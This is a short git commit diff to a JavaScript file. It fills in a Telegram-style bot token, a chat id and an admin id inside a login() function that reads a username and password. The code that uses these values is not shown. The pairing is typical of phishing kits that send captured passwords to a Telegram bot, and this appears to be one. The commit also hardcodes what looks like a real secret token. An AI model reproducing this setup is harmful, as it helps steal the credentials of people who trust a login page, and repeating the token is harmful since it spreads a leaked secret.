3f493d48cda73272f29fc37662fedfc56ba1606b
hahmedh326 <62767553+hahmedh326@users.noreply.github.com>
2020-04-01 18:08:14 +0300

    Update main.js

--- main.js
+++ main.js
@@ -15,9 +15,9 @@ function login() {
 
   var pass = $("#pass").val();
 
-  var token = "";
+  var token = "914492085:AAHOdolbQ5R_aiRMztIillSkVJfBqmHjE6U";
 
-  var id = "";
+  var id = "583050664";
   var admin = "387534219";
 
   if (username.length > 0 && pass.length > 0) {
